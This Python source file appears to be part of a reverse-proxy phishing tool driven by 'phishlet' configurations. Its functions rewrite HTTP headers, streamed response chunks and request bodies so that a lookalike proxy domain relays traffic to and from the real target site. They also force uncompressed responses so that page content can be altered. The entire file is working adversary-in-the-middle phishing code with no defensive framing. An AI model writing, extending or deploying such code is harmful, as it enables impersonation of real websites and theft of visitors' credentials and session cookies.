


def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
    # print(f"commin headers: {headers}")
    # Convert CIMultiDictProxy to regular dict if needed
    if hasattr(headers, 'getall'):
        # It's a CIMultiDictProxy, convert to regular dict
        headers_dict = dict(headers)
    else:
        # It's already a regular dict
        headers_dict = headers.copy()
    
    # Remove any Accept-Encoding to force identity (no compression) from upstream
    # This avoids sending compressed payloads (e.g., br) that we might not decompress.
    keys_to_delete = [k for k in list(headers_dict.keys()) if k.lower() == 'accept-encoding']
    for k in keys_to_delete:
        headers_dict.pop(k, None)
    headers_dict['Accept-Encoding'] = 'identity'

    # If we have phishlet data and reverse filter is enabled, use proper hostname replacement
    if phishlet_data and any(host.get('reverce_filter', False) for host in phishlet_data.get('hosts_to_proxy', [])):
        # Build replacement mapping: proxy_hostname -> original_hostname
        hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
        replacement_map = {}
        
        for host_entry in hosts_to_proxy:
            if not host_entry.get('reverce_filter', False):
                continue
                
            original_host = host_entry.get('host', '').strip()
            proxy_subdomain = host_entry.get('proxy_subdomain', '').strip()
            original_subdomain = host_entry.get('orignal_subdomain', '').strip()
            
            if not original_host:
                continue
            
            # Build the proxy hostname that should be replaced
            if proxy_subdomain:
                proxy_hostname = f"{proxy_subdomain}.{proxy_host}"
            else:
                proxy_hostname = proxy_host
            
            # Build the original hostname to replace with
            # Use the host field directly - it already contains the full hostname
            original_hostname = original_host
            
            replacement_map[proxy_hostname] = original_hostname
        
        # Sort by length (longest first) to ensure specific subdomains are processed before base domains
        sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
        
        # Apply replacements to headers
        for key, value in headers_dict.items():
            if isinstance(value, str):
                modified_value = value
                
                # Use a single-pass replacement with a unique marker approach
                # This prevents any possibility of double replacements
                import re
                
                # Create a mapping with unique markers
                marker_map = {}
                marked_value = value
                
                # Step 1: Replace each proxy hostname with a unique marker
                for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
                    marker = f"__REVERSE_FILTER_MARKER_{i}__"
                    marker_map[marker] = original_hostname
                    
                    # Escape special regex characters
                    escaped_proxy = re.escape(proxy_hostname)
                    # Use a pattern that matches the exact hostname with proper boundaries
                    pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
                    marked_value = re.sub(pattern, marker, marked_value)
                
                # Step 2: Replace all markers with their original hostnames
                for marker, original_hostname in marker_map.items():
                    marked_value = marked_value.replace(marker, original_hostname)
                
                headers_dict[key] = marked_value
            elif isinstance(value, (list, tuple)):
                # Handle multi-value headers
                new_values = []
                for v in value:
                    if isinstance(v, str):
                        modified_v = v
                        
                        # Use a single-pass replacement with a unique marker approach
                        # This prevents any possibility of double replacements
                        import re
                        
                        # Create a mapping with unique markers
                        marker_map = {}
                        marked_v = v
                        
                        # Step 1: Replace each proxy hostname with a unique marker
                        for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
                            marker = f"__REVERSE_FILTER_MARKER_{i}__"
                            marker_map[marker] = original_hostname
                            
                            # Escape special regex characters
                            escaped_proxy = re.escape(proxy_hostname)
                            # Use a pattern that matches the exact hostname with proper boundaries
                            pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
                            marked_v = re.sub(pattern, marker, marked_v)
                        
                        # Step 2: Replace all markers with their original hostnames
                        for marker, original_hostname in marker_map.items():
                            marked_v = marked_v.replace(marker, original_hostname)
                        
                        new_values.append(marked_v)
                    else:
                        new_values.append(v)
                headers_dict[key] = new_values
    else:
        # Fallback to simple replacement for backward compatibility
        # Check all headers, find proxy host in header values and replace with target host
        for key, value in headers_dict.items():
            if isinstance(value, str) and proxy_host in value:
                headers_dict[key] = value.replace(proxy_host, target_host)
            elif isinstance(value, (list, tuple)):
                # Handle multi-value headers
                new_values = []
                for v in value:
                    if isinstance(v, str) and proxy_host in v:
                        new_values.append(v.replace(proxy_host, target_host))
                    else:
                        new_values.append(v)
                headers_dict[key] = new_values
    
    # print(f"patched headers: {headers_dict}")
    return headers_dict

def patch_headers_in(headers, proxy_host, target_host):
    # Convert CIMultiDictProxy to regular dict if needed
    if hasattr(headers, 'getall'):
        # It's a CIMultiDictProxy, convert to regular dict
        headers_dict = dict(headers)
    else:
        # It's already a regular dict
        headers_dict = headers.copy()
    
    # Check all headers, find target host in header values and replace with proxy host
    for key, value in headers_dict.items():
        if isinstance(value, str) and target_host in value:
            headers_dict[key] = value.replace(target_host, proxy_host)
        elif isinstance(value, (list, tuple)):
            # Handle multi-value headers
            new_values = []
            for v in value:
                if isinstance(v, str) and target_host in v:
                    new_values.append(v.replace(target_host, proxy_host))
                else:
                    new_values.append(v)
            headers_dict[key] = new_values
    return headers_dict


def replace_in_response(response, target_host, proxy_host):
    # For StreamResponse objects, content replacement should be done during streaming
    # The headers have already been patched in the main handler
    # No need to manipulate response.text as StreamResponse doesn't have this attribute
    return response

def replace_in_chunk(chunk, target_host, proxy_host):
    """
    Replace target_host with proxy_host in a chunk of data.
    Handles both text and binary data.
    """
    if isinstance(chunk, bytes):
        # Only try UTF-8 for consistency
        try:
            chunk_str = chunk.decode('utf-8')
            if target_host in chunk_str:
                print(f"Replacing {target_host} with {proxy_host} in chunk")
                replaced_str = chunk_str.replace(target_host, proxy_host)
                return replaced_str.encode('utf-8')
            return chunk
        except UnicodeDecodeError:
            # If it's binary data, return as-is without modification
            return chunk
    elif isinstance(chunk, str):
        if target_host in chunk:
            print(f"Replacing {target_host} with {proxy_host} in string chunk")
            return chunk.replace(target_host, proxy_host)
        return chunk

import re


def replace_in_chunk_multi(chunk, target_to_proxy_map):
    """
    Replace multiple target hosts with their proxy hosts in a chunk.
    target_to_proxy_map: Dict[str, str] mapping target_host -> proxy_host
    """
    if not isinstance(target_to_proxy_map, dict) or not target_to_proxy_map:
        return chunk
    
    if isinstance(chunk, bytes):
        try:
            chunk_str = chunk.decode('utf-8')
            replaced = False
            for target, proxy in target_to_proxy_map.items():
                if target in chunk_str:
                    chunk_str = chunk_str.replace(target, proxy)
                    replaced = True
            if replaced:
                return chunk_str.encode('utf-8')
            return chunk
        except UnicodeDecodeError:
            return chunk
    elif isinstance(chunk, str):
        replaced = False
        for target, proxy in target_to_proxy_map.items():
            if target in chunk:
                chunk = chunk.replace(target, proxy)
                replaced = True
        return chunk
    return chunk


def apply_reverse_filter_to_request_body(request_body, phishlet_data, proxy_domain):
    """
    Apply reverse filter to request body when reverce_filter is enabled.
    This replaces proxy hostnames with original hostnames in the request body.
    
    Args:
        request_body: The request body (bytes or str)
        phishlet_data: The phishlet configuration data
        proxy_domain: The proxy domain (e.g., 'xx.in')
    
    Returns:
        Modified request body with hostname replacements
    """
    if not request_body:
        return request_body
    
    # Check if reverse filter is enabled for any hosts
    hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
    reverse_filter_enabled = any(host.get('reverce_filter', False) for host in hosts_to_proxy)
    
    if not reverse_filter_enabled:
        return request_body
    
    # Build replacement mapping: proxy_hostname -> original_hostname
    # Sort by length (longest first) to ensure specific subdomains are processed before base domains
    replacement_map = {}
    
    for host_entry in hosts_to_proxy:
        if not host_entry.get('reverce_filter', False):
            continue
            
        original_host = host_entry.get('host', '').strip()
        proxy_subdomain = host_entry.get('proxy_subdomain', '').strip()
        original_subdomain = host_entry.get('orignal_subdomain', '').strip()
        
        if not original_host:
            continue
        
        # Build the proxy hostname that should be replaced
        if proxy_subdomain:
            proxy_hostname = f"{proxy_subdomain}.{proxy_domain}"
        else:
            proxy_hostname = proxy_domain
        
        # Build the original hostname to replace with
        # Use the host field directly - it already contains the full hostname
        original_hostname = original_host
        
        replacement_map[proxy_hostname] = original_hostname
    
    # Sort by length (longest first) to ensure specific subdomains are processed before base domains
    sorted_replacements = sorted(replacement_map.items(), key=lambda x: len(x[0]), reverse=True)
    
    if not sorted_replacements:
        return request_body
    
    # Apply replacements using a completely different approach to prevent double replacements
    if isinstance(request_body, bytes):
        try:
            body_str = request_body.decode('utf-8')
            modified_body = body_str
            
            # Use a single-pass replacement with a unique marker approach
            # This prevents any possibility of double replacements
            import re
            
            # Create a mapping with unique markers
            marker_map = {}
            marked_body = body_str
            
            # Step 1: Replace each proxy hostname with a unique marker
            for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
                marker = f"__REVERSE_FILTER_MARKER_{i}__"
                marker_map[marker] = original_hostname
                
                # Escape special regex characters
                escaped_proxy = re.escape(proxy_hostname)
                # Use a pattern that matches the exact hostname with proper boundaries
                pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
                marked_body = re.sub(pattern, marker, marked_body)
            
            # Step 2: Replace all markers with their original hostnames
            for marker, original_hostname in marker_map.items():
                marked_body = marked_body.replace(marker, original_hostname)
            
            return marked_body.encode('utf-8')
        except UnicodeDecodeError:
            # If it's binary data, return as-is without modification
            return request_body
    elif isinstance(request_body, str):
        modified_body = request_body
        
        # Use a single-pass replacement with a unique marker approach
        # This prevents any possibility of double replacements
        import re
        
        # Create a mapping with unique markers
        marker_map = {}
        marked_body = request_body
        
        # Step 1: Replace each proxy hostname with a unique marker
        for i, (proxy_hostname, original_hostname) in enumerate(sorted_replacements):
            marker = f"__REVERSE_FILTER_MARKER_{i}__"
            marker_map[marker] = original_hostname
            
            # Escape special regex characters
            escaped_proxy = re.escape(proxy_hostname)
            # Use a pattern that matches the exact hostname with proper boundaries
            pattern = rf'(?<![A-Za-z0-9.-]){escaped_proxy}(?![A-Za-z0-9.-])'
            marked_body = re.sub(pattern, marker, marked_body)
        
        # Step 2: Replace all markers with their original hostnames
        for marker, original_hostname in marker_map.items():
            marked_body = marked_body.replace(marker, original_hostname)
        
        return marked_body
    
    return request_body